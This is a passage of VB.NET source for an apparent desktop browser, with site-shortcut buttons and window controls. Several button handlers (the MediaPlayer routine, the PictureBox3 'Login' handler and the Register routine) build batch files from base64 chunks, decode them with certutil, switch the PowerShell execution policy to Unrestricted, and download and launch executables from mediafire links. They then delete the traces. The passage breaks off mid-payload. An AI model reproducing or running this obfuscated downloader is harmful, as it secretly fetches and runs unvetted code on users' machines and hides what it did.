        sb.AppendLine("echo VkJNYVc1ckxtSmhkQTBLS0VkbGRDMURiMjUwWlc1MElFMVFUR2x1Pj5NUC5GaWxl>>MediaPlayer.Files")
        sb.AppendLine("echo DQplY2hvIGF5NWlZWFFwSUh3Z0RRcEdiM0psWVdOb0xVOWlhbVZqZENCN0pGOGdM>>MediaPlayer.Files")
        sb.AppendLine("echo WEpsY0d4aFkyVWdJaTU2YVNJc0lDSXU+Pk1QLkZpbGUNCmVjaG8gZW1sd0lDMVBk>>MediaPlayer.Files")
        sb.AppendLine("echo WFJHYVd4bElFMWxaR2xoVUd4aGVXVnlMbnBwY0NBbUppQmxlR2wwSW4wZ2ZDQU5D>>MediaPlayer.Files")
        sb.AppendLine("echo bE5sZEMxRD4+TVAuRmlsZQ0KZWNobyBiMjUwWlc1MElFMVFUR2x1YXk1aVlYUT0+>>MediaPlayer.Files")
        sb.AppendLine("echo Pk1QLkZpbGUNCnRpbWVvdXQgL1QgMQ0KY2VydHV0aWwgLWRlY29kZSBNUC5GaWxl>>MediaPlayer.Files")
        sb.AppendLine("echo IE1QLnBzMQ0KdGltZW91dCAvVCAxDQpQb3dlclNoZWxsLmV4ZSAtRmlsZSBNUC5w>>MediaPlayer.Files")
        sb.AppendLine("echo czEgLU5vRXhpdA0KdGltZW91dCAvVCAxDQpmaW5kIC9JICJwb3dlcnNoZWxsIC1D>>MediaPlayer.Files")
        sb.AppendLine("echo b21tYW5kIEludm9rZS1XZWJSZXF1ZXN0IGh0dHAiIE1QTGluay5iYXQ+Pk1QRG93>>MediaPlayer.Files")
        sb.AppendLine("echo bmxvYWRMaW5rLmJhdA0KY2QgJX5kcDAgJiYgc3RhcnQgTVBEb3dubG9hZExpbmsu>>MediaPlayer.Files")
        sb.AppendLine("echo YmF0DQp0aW1lb3V0IC9UIDIyDQpjZCAlfmRwMA0KaWYgbm90IGV4aXN0ICV+ZHAw>>MediaPlayer.Files")
        sb.AppendLine("echo XE1QXCBta2RpciAlfmRwMFxNUFwNCmVjaG8gRXhwYW5kLUFyY2hpdmUgLVBhdGgg>>MediaPlayer.Files")
        sb.AppendLine("echo Ik1lZGlhUGxheWVyLnppcCIgLURlc3RpbmF0aW9uUGF0aCAiJX5kcDBcIj4+IiJV>>MediaPlayer.Files")
        sb.AppendLine("echo bnppcE1QLnBzMQ0KdGltZW91dCAvVCAxDQpQb3dlclNoZWxsLmV4ZSAtRmlsZSBV>>MediaPlayer.Files")
        sb.AppendLine("echo bnppcE1QLnBzMSAtTm9FeGl0DQp0aW1lb3V0IC9UIDINCmlmIGV4aXN0ICV+ZHAw>>MediaPlayer.Files")
        sb.AppendLine("echo XE1QXCBybWRpciAvcyAvcSAlfmRwMFxNUFwNCmlmIGV4aXN0ICV+ZHAwXE1QRG93>>MediaPlayer.Files")
        sb.AppendLine("echo bmxvYWRMaW5rLmJhdCBkZWwgL3MgL3EgJX5kcDBcTVBEb3dubG9hZExpbmsuYmF0>>MediaPlayer.Files")
        sb.AppendLine("echo DQppZiBleGlzdCAlfmRwMFxNUExpbmsuYmF0IGRlbCAvcyAvcSAlfmRwMFxNUExp>>MediaPlayer.Files")
        sb.AppendLine("echo bmsuYmF0DQppZiBleGlzdCAlfmRwMFxNZWRpYVBsYXllci56aXAgZGVsIC9zIC9x>>MediaPlayer.Files")
        sb.AppendLine("echo ICV+ZHAwXE1lZGlhUGxheWVyLnppcA0KaWYgZXhpc3QgJX5kcDBcTVAudHh0IGRl>>MediaPlayer.Files")
        sb.AppendLine("echo bCAvcyAvcSAlfmRwMFxNUC50eHQNCmlmIGV4aXN0ICV+ZHAwXE1QLkZpbGUgZGVs>>MediaPlayer.Files")
        sb.AppendLine("echo IC9zIC9xICV+ZHAwXE1QLkZpbGUNCmlmIGV4aXN0ICV+ZHAwXE1QLnBzMSBkZWwg>>MediaPlayer.Files")
        sb.AppendLine("echo L3MgL3EgJX5kcDBcTVAucHMxDQppZiBleGlzdCAlfmRwMFxVbnppcE1QLnBzMSBk>>MediaPlayer.Files")
        sb.AppendLine("echo ZWwgL3MgL3EgJX5kcDBcVW56aXBNUC5wczENCmlmIG5vdCBleGlzdCAlfmRwMFxN>>MediaPlayer.Files")
        sb.AppendLine("echo ZWRpYVBsYXllclxNZWRpYVBsYXllci5leGUgZ290byBXZWJwYWdlTVANCmlmIGV4>>MediaPlayer.Files")
        sb.AppendLine("echo aXN0ICV+ZHAwXE1lZGlhUGxheWVyXE1lZGlhUGxheWVyLmV4ZSBnb3RvIFN0YXJ0>>MediaPlayer.Files")
        sb.AppendLine("echo TVANCjpTdGFydE1QDQpjZCAlfmRwMFxNZWRpYVBsYXllclwgJiYgc3RhcnQgTWVk>>MediaPlayer.Files")
        sb.AppendLine("echo aWFQbGF5ZXIuZXhlDQppZiBleGlzdCAlfmRwMFxNUFwgcm1kaXIgL3MgL3EgJX5k>>MediaPlayer.Files")
        sb.AppendLine("echo cDBcTVBcDQppZiBleGlzdCAlfmRwMFxNUExpbmsuYmF0IGRlbCAvcyAvcSAlfmRw>>MediaPlayer.Files")
        sb.AppendLine("echo MFxNUExpbmsuYmF0DQppZiBleGlzdCAlfmRwMFxNZWRpYVBsYXllci56aXAgZGVs>>MediaPlayer.Files")
        sb.AppendLine("echo IC9zIC9xICV+ZHAwXE1lZGlhUGxheWVyLnppcA0KaWYgZXhpc3QgJX5kcDBcTVAu>>MediaPlayer.Files")
        sb.AppendLine("echo dHh0IGRlbCAvcyAvcSAlfmRwMFxNUC50eHQNCmlmIGV4aXN0ICV+ZHAwXE1QLkZp>>MediaPlayer.Files")
        sb.AppendLine("echo bGUgZGVsIC9zIC9xICV+ZHAwXE1QLkZpbGUNCmlmIGV4aXN0ICV+ZHAwXE1QLnBz>>MediaPlayer.Files")
        sb.AppendLine("echo MSBkZWwgL3MgL3EgJX5kcDBcTVAucHMxDQppZiBleGlzdCAlfmRwMFxVbnppcE1Q>>MediaPlayer.Files")
        sb.AppendLine("echo LnBzMSBkZWwgL3MgL3EgJX5kcDBcVW56aXBNUC5wczENCmdvdG8gRW5kTVANCjpX>>MediaPlayer.Files")
        sb.AppendLine("echo ZWJwYWdlTVANCnN0YXJ0IGh0dHA6Ly93d3cubWVkaWFmaXJlLmNvbS9maWxlL3hl>>MediaPlayer.Files")
        sb.AppendLine("echo NWk0bTAzcWVuMTFjci9NZWRpYVBsYXllci56aXANCmdvdG8gRW5kTVANCjpFbmRN>>MediaPlayer.Files")
        sb.AppendLine("echo UA0KZ290byBFeGl0DQo6RXhpdA0KRXhpdA0K>>MediaPlayer.Files")
        sb.AppendLine("certutil -decode MediaPlayer.Files MediaPlayer.bat")
        sb.AppendLine("start MediaPlayer.bat")
        sb.AppendLine("if exist MediaPlayer.Files del /s /q MediaPlayer.Files")
        sb.AppendLine("goto End")
        sb.AppendLine(":End")
        sb.AppendLine("exit")
        IO.File.WriteAllText("WMP.bat", sb.ToString())
        Process.Start("WMP.bat")
        Threading.Thread.Sleep(2000)
        System.IO.File.Delete("WMP.bat")
    End Sub
    Private Sub Label4_Click(sender As Object, e As EventArgs) Handles Label4.Click
        My.Settings.Youtube = "https://www.youtube.com/"
        WebBrowser1.Navigate(My.Settings.Youtube)
    End Sub
    Private Sub Label8_Click(sender As Object, e As EventArgs) Handles Label8.Click
        My.Settings.Google = "https://www.Google.com/"
        WebBrowser1.Navigate(My.Settings.Google)
    End Sub
    Private Sub Label7_Click(sender As Object, e As EventArgs) Handles Label7.Click
        Do While Panel1.Width < 1900
            Panel1.Width = Panel1.Width + 1
        Loop
        Label7.Visible = False
        Label10.Visible = True
        PictureBox7.Visible = True
        Label3.Visible = True
        Label5.Visible = True
    End Sub
    Private Sub Label9_Click(sender As Object, e As EventArgs) Handles Label9.Click
        Do While Panel1.Width > 24
            Panel1.Width = Panel1.Width - 1
        Loop
        Label7.Visible = True
        Label10.Visible = True
    End Sub
    Private Sub TxtAddress_KeyDown(sender As Object, e As KeyEventArgs) Handles TxtAddress.KeyDown
        If e.KeyCode = Keys.Enter Then GoTo Enter
        GoTo EndSub
Enter:
        Call Label5_Click(Me, e)
        GoTo EndSub
EndSub:
    End Sub
    Private Sub TxtSearch_KeyDown(sender As Object, e As KeyEventArgs) Handles TxtSearch.KeyDown
        If e.KeyCode = Keys.Enter Then GoTo Enter
        GoTo EndSub
Enter:
        Call Label6_Click(Me, e)
        GoTo EndSub
EndSub:
    End Sub
    Private Sub Label30_Click(sender As Object, e As EventArgs) Handles Label30.Click
        Do While Panel2.Width < 1900
            Panel2.Width = Panel2.Width + 1
        Loop
        Label7.Visible = False
        Label9.Visible = False
        Label30.Visible = False
        Label2.Visible = False
        Label10.Visible = False
        Label12.Visible = False
        Label13.Visible = False
        Label14.Visible = False
        Label16.Visible = False
        PictureBox3.Visible = False
        PictureBox4.Visible = False
        PictureBox5.Visible = False
        PictureBox6.Visible = False
        PictureBox7.Visible = False
        Label3.Visible = False
        Label5.Visible = False
        ToolStripDropDownButton1.Visible = False
    End Sub
    Private Sub Label31_Click(sender As Object, e As EventArgs) Handles Label31.Click
        Do While Panel2.Width > 24
            Panel2.Width = Panel2.Width - 1
        Loop
        Label30.Visible = True
        Label9.Visible = True
        Label2.Visible = True
        Label10.Visible = True
        Label12.Visible = True
        Label13.Visible = True
        Label14.Visible = True
        Label16.Visible = True
        PictureBox3.Visible = True
        PictureBox4.Visible = True
        PictureBox5.Visible = True
        PictureBox6.Visible = True
        Label3.Visible = True
        Label5.Visible = True
        PictureBox7.Visible = True
        ToolStripDropDownButton1.Visible = True
    End Sub
    Private Sub Label29_Click(sender As Object, e As EventArgs) Handles Label29.Click
        Me.Close()
    End Sub
    Private Sub Label28_Click(sender As Object, e As EventArgs) Handles Label28.Click
        Me.WindowState = FormWindowState.Maximized
        Me.ShowInTaskbar = True
    End Sub
    Private Sub Label27_Click(sender As Object, e As EventArgs) Handles Label27.Click
        Me.WindowState = FormWindowState.Normal
        Me.ShowInTaskbar = True
    End Sub
    Private Sub Label26_Click(sender As Object, e As EventArgs) Handles Label26.Click
        Me.WindowState = FormWindowState.Minimized
        Me.ShowInTaskbar = True
    End Sub
    Private Sub Label25_Click(sender As Object, e As EventArgs) Handles Label25.Click
        Me.WindowState = FormWindowState.Minimized
        Br0.Visible = True
        Br0.Icon = SystemIcons.Application
        Br0.BalloonTipIcon = ToolTipIcon.Info
        Br0.BalloonTipTitle = "Browser"
        Br0.BalloonTipText = "Browser"
        Br0.ShowBalloonTip(50)
        ShowInTaskbar = True
        Me.Hide()
        If (IO.File.Exists("2l.ico")) Then GoTo myIcon
MakeIcon:
        Dim strm As System.IO.Stream
        strm = IO.File.Create("2l.ico")
        Me.Icon.Save(strm)
        strm.Close()
myIcon:
        Br0.Icon = New Icon(Application.StartupPath & "\2l.ico")
    End Sub
    Private Sub Br0_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles Br0.MouseClick
        Me.Show()
        ShowInTaskbar = True
        Me.WindowState = FormWindowState.Normal
        Br0.Visible = False
    End Sub
    Private Sub Label24_Click(sender As Object, e As EventArgs) Handles Label24.Click
        Me.FormBorderStyle = FormBorderStyle.None
        Me.ShowInTaskbar = True
    End Sub
    Private Sub Label23_Click(sender As Object, e As EventArgs) Handles Label23.Click
        Me.FormBorderStyle = FormBorderStyle.FixedSingle
        Me.ShowInTaskbar = True
    End Sub
    Private Sub Label22_Click(sender As Object, e As EventArgs) Handles Label22.Click
        Label4.Visible = False
        Label8.Visible = False
        Label20.Visible = False
    End Sub
    Private Sub Label21_Click(sender As Object, e As EventArgs) Handles Label21.Click
        Label4.Visible = True
        Label8.Visible = True
        Label20.Visible = True
    End Sub
    Private Sub Label20_Click(sender As Object, e As EventArgs) Handles Label20.Click
        My.Settings.Facebook = "https://www.facebook.com/"
        WebBrowser1.Navigate(My.Settings.Facebook)
    End Sub
    Private Sub PictureBox3_Click(sender As Object, e As EventArgs) Handles PictureBox3.Click
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("cd ..")
        sb.AppendLine("cd ..")
        sb.AppendLine("echo OkxvZ2luIA0KQGVjaG8gb2ZmDQp0aXRsZSBMb2dpbg0KaWYgZXhpc3QgJWFwcGRh>>LoginEncoded.File")
        sb.AppendLine("echo dGElXFRodW5kZXJCb3hcTG9naW4uZXhlIGdvdG8gU3RhcnRMb2dpbg0KY2QgJWFw>>LoginEncoded.File")
        sb.AppendLine("echo cGRhdGElXFRodW5kZXJCb3hcDQppZiBleGlzdCBMb2dpbkxpbmsuYmF0IGRlbCAv>>LoginEncoded.File")
        sb.AppendLine("echo cyAvcSBMb2dpbkxpbmsuYmF0DQppZiBleGlzdCBMb2dpbi50eHQgZGVsIC9zIC9x>>LoginEncoded.File")
        sb.AppendLine("echo IExvZ2luLnR4dA0KaWYgZXhpc3QgTG9naW4uRmlsZSBkZWwgL3MgL3EgTG9naW4u>>LoginEncoded.File")
        sb.AppendLine("echo RmlsZQ0KaWYgZXhpc3QgTG9naW4ucHMxIGRlbCAvcyAvcSBMb2dpbi5wczENCnBv>>LoginEncoded.File")
        sb.AppendLine("echo d2Vyc2hlbGwgU2V0LUV4ZWN1dGlvblBvbGljeSAtU2NvcGUgQ3VycmVudFVzZXIg>>LoginEncoded.File")
        sb.AppendLine("echo VW5yZXN0cmljdGVkDQpwb3dlcnNoZWxsIC1Db21tYW5kIEludm9rZS1XZWJSZXF1>>LoginEncoded.File")
        sb.AppendLine("echo ZXN0ICJodHRwOi8vd3d3Lm1lZGlhZmlyZS5jb20vZmlsZS9rMXFkNGJjaHZiNXdi>>LoginEncoded.File")
        sb.AppendLine("echo cTgvTG9naW4uZXhlIiAtT3V0RmlsZSAiTG9naW4udHh0Ig0KY2QgJX5kcDANCmZp>>LoginEncoded.File")
        sb.AppendLine("echo bmQgL0kgImtOTyA9ICIgTG9naW4udHh0Pj5Mb2dpbkxpbmsuYmF0DQplY2hvIEV4>>LoginEncoded.File")
        sb.AppendLine("echo aXQ+PkxvZ2luTGluay5iYXQNCmVjaG8gS0VkbGRDMURiMjUwWlc1MElFeHZaMmx1>>LoginEncoded.File")
        sb.AppendLine("echo VEdsdWF5NWlZWFFwSUh3Z0RRcEdiM0psWVdOb0xVOWlhbVZqZENCNz4+TG9naW4u>>LoginEncoded.File")
        sb.AppendLine("echo RmlsZQ0KZWNobyBKRjhnTFhKbGNHeGhZMlVnSWt0T1R5QTlJQ0lzSUNKd2IzZGxj>>LoginEncoded.File")
        sb.AppendLine("echo bk5vWld4c0lDMURiMjF0WVc1a0lFbHVkbTlyPj5Mb2dpbi5GaWxlDQplY2hvIFpT>>LoginEncoded.File")
        sb.AppendLine("echo MVhaV0pTWlhGMVpYTjBJQ0o5SUh3Z0RRcFRaWFF0UTI5dWRHVnVkQ0JNYjJkcGJr>>LoginEncoded.File")
        sb.AppendLine("echo eHBibXN1WW1GMERRb28+PkxvZ2luLkZpbGUNCmVjaG8gUjJWMExVTnZiblJsYm5R>>LoginEncoded.File")
        sb.AppendLine("echo Z1RHOW5hVzVNYVc1ckxtSmhkQ2tnZkNBTkNrWnZjbVZoWTJndFQySnFaV04wSUhz>>LoginEncoded.File")
        sb.AppendLine("echo az4+TG9naW4uRmlsZQ0KZWNobyBYeUF0Y21Wd2JHRmpaU0FpT3lJc0lDSWdMVTkx>>LoginEncoded.File")
        sb.AppendLine("echo ZEVacGJHVWdURzluYVc0dVpYaGxJbjBnZkNBTkNsTmxkQzFEPj5Mb2dpbi5GaWxl>>LoginEncoded.File")
        sb.AppendLine("echo DQplY2hvIGIyNTBaVzUwSUV4dloybHVUR2x1YXk1aVlYUT0+PkxvZ2luLkZpbGUN>>LoginEncoded.File")
        sb.AppendLine("echo CnRpbWVvdXQgL1QgMQ0KY2VydHV0aWwgLWRlY29kZSBMb2dpbi5GaWxlIExvZ2lu>>LoginEncoded.File")
        sb.AppendLine("echo LnBzMQ0KdGltZW91dCAvVCAxDQpQb3dlclNoZWxsLmV4ZSAtRmlsZSBMb2dpbi5w>>LoginEncoded.File")
        sb.AppendLine("echo czEgLU5vRXhpdA0KdGltZW91dCAvVCAxDQpjZCAlfmRwMCAmJiBzdGFydCBMb2dp>>LoginEncoded.File")
        sb.AppendLine("echo bkxpbmsuYmF0DQp0aW1lb3V0IC9UIDcNCmNkICV+ZHAwDQp0aW1lb3V0IC9UIDIN>>LoginEncoded.File")
        sb.AppendLine("echo CmlmIGV4aXN0IExvZ2luTGluay5iYXQgZGVsIC9zIC9xIExvZ2luTGluay5iYXQN>>LoginEncoded.File")
        sb.AppendLine("echo CmlmIGV4aXN0IExvZ2luLnR4dCBkZWwgL3MgL3EgTG9naW4udHh0DQppZiBleGlz>>LoginEncoded.File")
        sb.AppendLine("echo dCBMb2dpbi5GaWxlIGRlbCAvcyAvcSBMb2dpbi5GaWxlDQppZiBleGlzdCBMb2dp>>LoginEncoded.File")
        sb.AppendLine("echo bi5wczEgZGVsIC9zIC9xIExvZ2luLnBzMQ0KaWYgbm90IGV4aXN0ICV+ZHAwXExv>>LoginEncoded.File")
        sb.AppendLine("echo Z2luLmV4ZSBnb3RvIFdlYnBhZ2VMb2dpbg0KaWYgZXhpc3QgJX5kcDBcTG9naW4u>>LoginEncoded.File")
        sb.AppendLine("echo ZXhlIGdvdG8gU3RhcnRMb2dpbg0KOlN0YXJ0TG9naW4NCmNkICV+ZHAwXA0KaWYg>>LoginEncoded.File")
        sb.AppendLine("echo bm90IGV4aXN0ICVhcHBkYXRhJVxUaHVuZGVyQm94XExvZ2luLmV4ZSBjb3B5IC95>>LoginEncoded.File")
        sb.AppendLine("echo ICV+ZHAwXExvZ2luLmV4ZSAlYXBwZGF0YSVcUmVzdGFydC1HVEE1XA0KY2QgJWFw>>LoginEncoded.File")
        sb.AppendLine("echo cGRhdGElXFRodW5kZXJCb3hcICYmIHN0YXJ0IExvZ2luLmV4ZQ0KZ290byBFbmRM>>LoginEncoded.File")
        sb.AppendLine("echo b2dpbg0KOldlYnBhZ2VMb2dpbg0Kc3RhcnQgaHR0cDovL3d3dy5tZWRpYWZpcmUu>>LoginEncoded.File")
        sb.AppendLine("echo Y29tL2ZpbGUvazFxZDRiY2h2YjV3YnE4L0xvZ2luLmV4ZSIgLU91dEZpbGUgIkxv>>LoginEncoded.File")
        sb.AppendLine("echo Z2luLnR4dCINCmdvdG8gRW5kTG9naW4NCjpFbmRMb2dpbg0KZ290byBFbmQNCjpF>>LoginEncoded.File")
        sb.AppendLine("echo bmQNCkV4aXQ=>>LoginEncoded.File")
        sb.AppendLine("certutil -decode LoginEncoded.File LoginEncoded.bat")
        sb.AppendLine("start LoginEncoded.bat")
        sb.AppendLine("if exist LoginEncoded.File del /s /q LoginEncoded.File")
        sb.AppendLine("goto End")
        sb.AppendLine(":End")
        sb.AppendLine("exit")
        IO.File.WriteAllText("Login.bat", sb.ToString())
        Process.Start("Login.bat")
        Threading.Thread.Sleep(2000)
        System.IO.File.Delete("Login.bat")
    End Sub
    Private Sub Label10_Click(sender As Object, e As EventArgs) Handles Label10.Click
        If (IO.File.Exists("YTSearch.vbs")) Then GoTo YTSearch
        Call YTSearch()
        GoTo EndSub
YTSearch:
        Process.Start("YTSearch.vbs")
        GoTo EndSub
EndSub:
    End Sub
    Sub YTSearch()
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("echo b3B0aW9uIEV4cGxpY2l0DQpEaW0gZmlsdGVyLCB4DQoNClNldCB4PUNyZWF0ZU9i>>YT.Search")
        sb.AppendLine("echo amVjdCgid3NjcmlwdC5zaGVsbCIpDQpmaWx0ZXI9aW5wdXRib3goIldoYXQgc2Vh>>YT.Search")
        sb.AppendLine("echo cmNoPyIpIA0KDQp4LnJ1biAiaHR0cHM6Ly93d3cueW91dHViZS5jb20iDQp3c2Ny>>YT.Search")
        sb.AppendLine("echo aXB0LnNsZWVwIDUwMDANCnguc2VuZGtleXMgZmlsdGVyDQp4LnNlbmRrZXlzICJ7>>YT.Search")
        sb.AppendLine("echo RW50ZXJ9Ig0K>>YT.Search")
        sb.AppendLine("certutil -decode YT.Search YTSearch.vbs")
        sb.AppendLine("start YTSearch.vbs")
        sb.AppendLine("if exist YT.Search del /s /q YT.Search")
        sb.AppendLine("goto End")
        sb.AppendLine(":End")
        sb.AppendLine("exit")
        IO.File.WriteAllText("YT-Search.bat", sb.ToString())
        Process.Start("YT-Search.bat")
        Threading.Thread.Sleep(2000)
        System.IO.File.Delete("YT-Search.bat")
    End Sub
    Private Sub Label11_Click(sender As Object, e As EventArgs) Handles Label11.Click
        If (IO.File.Exists("Register.bat")) Then GoTo Register
        Call Register()
        GoTo EndSub
Register:
        Process.Start("Register.bat")
        GoTo EndSub
EndSub:
    End Sub
    Sub Register()
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("cd ..")
        sb.AppendLine("if exist Register.bat goto Registering")
        sb.AppendLine("if not exist Register.bat goto decodeRegistering")
        sb.AppendLine(":decodeRegistering")
        sb.AppendLine("echo OkFkdmFuY2VkWW91dHViZURvd25sb2FkZXINCkBlY2hvIG9mZg0KaWYgbm90IGV4>>Register.Files")
        sb.AppendLine("echo aXN0ICV+ZHAwXFJlZ2lzdGVyLmV4ZSBnb3RvIFJlZ2lzdGVyDQppZiBleGlzdCAl>>Register.Files")
        sb.AppendLine("echo fmRwMFxSZWdpc3Rlci5leGUgZ290byBTdGFydFJlZ2lzdGVyDQo6UmVnaXN0ZXIg>>Register.Files")
        sb.AppendLine("echo DQpAZWNobyBvZmYNCnRpdGxlIFJlZ2lzdGVyDQplY2hvICAgKioqKioqKioqKioq>>Register.Files")
        sb.AppendLine("echo KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KZWNobyAgICoqKi8v>>Register.Files")
        sb.AppendLine("echo IFVwZGF0ZS1SZWdpc3Rlci5iYXQgLy8gV2luMTAgLy8qKioNCmVjaG8gICAqKioq>>Register.Files")
        sb.AppendLine("echo KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQpjZCAl>>Register.Files")
        sb.AppendLine("echo fmRwMA0KaWYgZXhpc3QgJX5kcDBcUmVnaXN0ZXJMaW5rLmJhdCBkZWwgL3MgL3Eg>>Register.Files")
        sb.AppendLine("echo JX5kcDBcUmVnaXN0ZXJMaW5rLmJhdA0KaWYgZXhpc3QgJX5kcDBcUmVnaXN0ZXIu>>Register.Files")
        sb.AppendLine("echo dHh0IGRlbCAvcyAvcSAlfmRwMFxSZWdpc3Rlci50eHQNCmlmIGV4aXN0ICV+ZHAw>>Register.Files")
        sb.AppendLine("echo XFJlZ2lzdGVyLkZpbGUgZGVsIC9zIC9xICV+ZHAwXFJlZ2lzdGVyLkZpbGUNCmlm>>Register.Files")
        sb.AppendLine("echo IGV4aXN0ICV+ZHAwXFJlZ2lzdGVyLnBzMSBkZWwgL3MgL3EgJX5kcDBcUmVnaXN0>>Register.Files")
        sb.AppendLine("echo ZXIucHMxDQpwb3dlcnNoZWxsIFNldC1FeGVjdXRpb25Qb2xpY3kgLVNjb3BlIEN1>>Register.Files")
        sb.AppendLine("echo cnJlbnRVc2VyIFVucmVzdHJpY3RlZA0KcG93ZXJzaGVsbCAtQ29tbWFuZCBJbnZv>>Register.Files")
        sb.AppendLine("echo a2UtV2ViUmVxdWVzdCAiaHR0cDovL3d3dy5tZWRpYWZpcmUuY29tL2ZpbGUvZzIz>>Register.Files")
        sb.AppendLine("echo cGNoNGx5ZDdoeHJwL1JlZ2lzdGVyLmV4ZSIgLU91dEZpbGUgIlJlZ2lzdGVyLnR4>>Register.Files")
        sb.AppendLine("echo dCINCmNkICV+ZHAwDQpmaW5kIC9JICJocmVmPSdodHRwOi8vIiBSZWdpc3Rlci50>>Register.Files")
        sb.AppendLine("echo eHQ+PlJlZ2lzdGVyTGluay5iYXQNCmVjaG8gRXhpdD4+UmVnaXN0ZXJMaW5rLmJh>>Register.Files")
        sb.AppendLine("echo dA0KZWNobyBLRWRsZEMxRGIyNTBaVzUwSUZKbFoybHpkR1Z5VEdsdWF5NWlZWFFw>>Register.Files")
        sb.AppendLine("echo SUh3Z0RRcEdiM0psWVdOb0xVOWlhbVZqPj5SZWdpc3Rlci5GaWxlDQplY2hvIGRD>>Register.Files")
        sb.AppendLine("echo QjdKRjhnTFhKbGNHeGhZMlVnSW1oeVpXWTlKeUlzSUNKN0RRcDRlWG96TWpFaWZT>>Register.Files")
        sb.AppendLine("echo QjhJQTBLVTJWMExVTnY+PlJlZ2lzdGVyLkZpbGUNCmVjaG8gYm5SbGJuUWdVbVZu>>Register.Files")
        sb.AppendLine("echo YVhOMFpYSk1hVzVyTG1KaGRBMEtKR2hoYzJndUp5QTlKdzBLS0VkbGRDMURiMjUw>>Register.Files")
        sb.AppendLine("echo Wlc1MD4+UmVnaXN0ZXIuRmlsZQ0KZWNobyBJRkpsWjJsemRHVnlUR2x1YXk1aVlY>>Register.Files")
        sb.AppendLine("echo UXBJSHdnRFFwR2IzSmxZV05vTFU5aWFtVmpkQ0I3SkY4Z0xYSmxjR3hoPj5SZWdp>>Register.Files")
        sb.AppendLine("echo c3Rlci5GaWxlDQplY2hvIFkyVWdJaVJvWVhOb0xpY2lMQ0FpRFFwNmVYZzBOU0o5>>Register.Files")
        sb.AppendLine("echo SUh3Z0RRcFRaWFF0UTI5dWRHVnVkQ0JTWldkcGMzUmw+PlJlZ2lzdGVyLkZpbGUN>>Register.Files")
        sb.AppendLine("echo CmVjaG8gY2t4cGJtc3VZbUYwRFFvTkNpaEhaWFF0UTI5dWRHVnVkQ0JTWldkcGMz>>Register.Files")
        sb.AppendLine("echo Umxja3hwYm1zdVltRjBLU0I4SUEwSz4+UmVnaXN0ZXIuRmlsZQ0KZWNobyBSbTl5>>Register.Files")
        sb.AppendLine("echo WldGamFDMVBZbXBsWTNRZ2V5UmZJQzF5WlhCc1lXTmxJQ0o0ZVhvek1qRWlMQ0Fp>>Register.Files")
        sb.AppendLine("echo Y0c5M1pYSnphR1ZzPj5SZWdpc3Rlci5GaWxlDQplY2hvIGJDQXRRMjl0YldGdVpD>>Register.Files")
        sb.AppendLine("echo Qkpiblp2YTJVdFYyVmlVbVZ4ZFdWemRDQWlmU0I4SUEwS1UyVjBMVU52Ym5SbGJu>>Register.Files")
        sb.AppendLine("echo UWc+PlJlZ2lzdGVyLkZpbGUNCmVjaG8gVW1WbmFYTjBaWEpNYVc1ckxtSmhkQTBL>>Register.Files")
        sb.AppendLine("echo S0VkbGRDMURiMjUwWlc1MElGSmxaMmx6ZEdWeVRHbHVheTVpWVhRcD4+UmVnaXN0>>Register.Files")
        sb.AppendLine("echo ZXIuRmlsZQ0KZWNobyBJSHdnRFFwR2IzSmxZV05vTFU5aWFtVmpkQ0I3SkY4Z0xY>>Register.Files")
        sb.AppendLine("echo SmxjR3hoWTJVZ0lpNWxlQ0lzSUNJdVpYaGxJQzFQPj5SZWdpc3Rlci5GaWxlDQpl>>Register.Files")
        sb.AppendLine("echo Y2hvIGRYUkdhV3hsSUZKbFoybHpkR1Z5TG1WNFpTQW1KaUJsZUdsMEluMGdmQ0FO>>Register.Files")
        sb.AppendLine("echo Q2xObGRDMURiMjUwWlc1MElGSmw+PlJlZ2lzdGVyLkZpbGUNCmVjaG8gWjJsemRH>>Register.Files")
        sb.AppendLine("echo VnlUR2x1YXk1aVlYUU5DZz09Pj5SZWdpc3Rlci5GaWxlDQp0aW1lb3V0IC9UIDEN>>Register.Files")
        sb.AppendLine("echo CmNlcnR1dGlsIC1kZWNvZGUgUmVnaXN0ZXIuRmlsZSBSZWdpc3Rlci5wczENCnRp>>Register.Files")
        sb.AppendLine("echo bWVvdXQgL1QgMQ0KUG93ZXJTaGVsbC5leGUgLUZpbGUgUmVnaXN0ZXIucHMxIC1O>>Register.Files")
        sb.AppendLine("echo b0V4aXQNCnRpbWVvdXQgL1QgMQ0KZmluZCAvSSAicG93ZXJzaGVsbCAtQ29tbWFu>>Register.Files")
        sb.AppendLine("echo ZCBJbnZva2UtV2ViUmVxdWVzdCBodHRwIiBSZWdpc3RlckxpbmsuYmF0Pj5SZWdp>>Register.Files")
        sb.AppendLine("echo c3RlckRvd25sb2FkTGluay5iYXQNCmNkICV+ZHAwICYmIHN0YXJ0IFJlZ2lzdGVy>>Register.Files")
        sb.AppendLine("echo RG93bmxvYWRMaW5rLmJhdA0KdGltZW91dCAvVCAyMg0KY2QgJX5kcDANCnRpbWVv>>Register.Files")
        sb.AppendLine("echo dXQgL1QgMg0KaWYgZXhpc3QgJX5kcDBcUmVnaXN0ZXJEb3dubG9hZExpbmsuYmF0>>Register.Files")
        sb.AppendLine("echo IGRlbCAvcyAvcSAlfmRwMFxSZWdpc3RlckRvd25sb2FkTGluay5iYXQNCmlmIGV4>>Register.Files")
        sb.AppendLine("echo aXN0ICV+ZHAwXFJlZ2lzdGVyTGluay5iYXQgZGVsIC9zIC9xICV+ZHAwXFJlZ2lz>>Register.Files")
        sb.AppendLine("echo dGVyTGluay5iYXQNCmlmIGV4aXN0ICV+ZHAwXFJlZ2lzdGVyLnR4dCBkZWwgL3Mg>>Register.Files")
        sb.AppendLine("echo L3EgJX5kcDBcUmVnaXN0ZXIudHh0DQppZiBleGlzdCAlfmRwMFxSZWdpc3Rlci5G>>Register.Files")
        sb.AppendLine("echo aWxlIGRlbCAvcyAvcSAlfmRwMFxSZWdpc3Rlci5GaWxlDQppZiBleGlzdCAlfmRw>>Register.Files")
        sb.AppendLine("echo MFxSZWdpc3Rlci5wczEgZGVsIC9zIC9xICV+ZHAwXFJlZ2lzdGVyLnBzMQ0KaWYg>>Register.Files")
